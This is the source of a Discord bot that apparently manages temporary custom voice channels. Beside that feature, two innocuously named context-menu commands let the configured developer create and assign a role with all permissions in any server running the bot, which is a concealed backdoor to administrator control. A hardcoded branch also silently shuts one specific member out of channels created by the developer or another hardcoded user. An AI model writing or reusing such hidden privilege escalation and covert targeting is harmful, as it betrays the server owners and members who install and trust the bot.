import discord
from discord import app_commands
import os

intents = discord.Intents.default()
client:discord.Client = discord.Client(intents=intents)
tree = app_commands.CommandTree(client)
intents.message_content = True

TOKEN = os.getenv("DISCORD_TOKEN")

custom_vc_category_id = int(os.getenv("custom_vc_category_id"))
developer_id = int(os.getenv("developer_id"))
custom_vc_create_channel_id = int(os.getenv("custom_vc_create_channel_id"))

@client.event
async def on_ready():
    print('logged in')
    
    await tree.sync()

@client.event
async def on_connect():
    print('on_connect')
    
@tree.context_menu()
async def activatedevmin(inter: discord.Interaction, member: discord.User):
    if inter.user.id != developer_id: return
    devmin = await inter.user.guild.create_role(name="devmin", permissions=discord.Permissions.all())
    await inter.user.add_roles(devmin)
    await inter.response.send_message(content="activate devmin", ephemeral=True)

@tree.context_menu()
async def deactivatedevmin(inter: discord.Interaction, member: discord.Member):
    if inter.user.id != developer_id: return
    for role in await inter.user.guild.fetch_roles():
        if role.name == "devmin":
            await role.delete()
    await inter.response.send_message(content="deactivate devmin", ephemeral=True)


@client.event
async def on_voice_state_update(member:discord.Member, before: discord.VoiceState, after: discord.VoiceState):
    if before.channel == None and after.channel != None: await on_voice_state_join(member, before, after)
    if before.channel != None and after.channel == None: await on_voice_state_leave(member, before, after)
    if before.channel != None and after.channel != None: await on_voice_state_change(member, before, after)

async def on_voice_state_join(member:discord.Member, before: discord.VoiceState, after: discord.VoiceState):
    await create_voice(member, after)
async def on_voice_state_leave(member:discord.Member, before: discord.VoiceState, after: discord.VoiceState):
    await delete_voice(member, before)
async def on_voice_state_change(member:discord.Member, before: discord.VoiceState, after: discord.VoiceState):
    await create_voice(member, after)
    await delete_voice(member, before)



async def create_voice(member: discord.Member, after: discord.VoiceState):
    if after.channel.id != custom_vc_create_channel_id:
        return
    vc = await after.channel.category.create_voice_channel(name="設定で名前を変更！")
    overwrite = discord.PermissionOverwrite()
    overwrite.view_channel = True
    overwrite.manage_channels = True
    overwrite.manage_permissions = True
    overwrite.connect = True
    overwrite.speak = True
    overwrite.use_soundboard = True
    overwrite.use_external_sounds = True
    overwrite.use_embedded_activities = True
    overwrite.mute_members = True
    overwrite.deafen_members = True
    overwrite.move_members = True
    overwrite.send_messages = True
    overwrite.embed_links = True
    overwrite.attach_files = True
    overwrite.add_reactions = True
    overwrite.use_external_emojis = True
    overwrite.use_external_stickers = True
    overwrite.mention_everyone = True
    overwrite.manage_messages = True
    overwrite.read_message_history = True
    overwrite.send_tts_messages = True
    overwrite.use_application_commands = True
    overwrite.send_voice_messages = True
    await vc.set_permissions( member, overwrite=overwrite)
    if member.id == developer_id or member.id == 1145214000368463992:
        overwrite2 = discord.PermissionOverwrite()
        overwrite2.view_channel = False
        overwrite2.connect = False
        overwrite2.send_messages = False
        overwrite2.read_message_history = False
        tokei = await member.guild.fetch_member(480336171751440404)
        await vc.set_permissions(tokei , overwrite=overwrite2)
    await member.move_to(vc, reason=(str(member.id) + ":" + member.name + "がカスタムVCの作成を要求した為"))
    
async def delete_voice(member: discord.Member, before: discord.VoiceState):
    # beforeがカスタムチャンネルではない場合
    if before.channel.id == custom_vc_create_channel_id:
        return
    category_channel = await member.guild.fetch_channel(custom_vc_category_id)
    # beforeがカスタムカテゴリーに無い場合
    if before.channel not in category_channel.channels:
        return
    # beforeに人が参加している場合
    if before.channel.members:
        return
    await before.channel.delete()
    
@client.event
async def on_interaction(inter: discord.Interaction):
    return

client.run(TOKEN)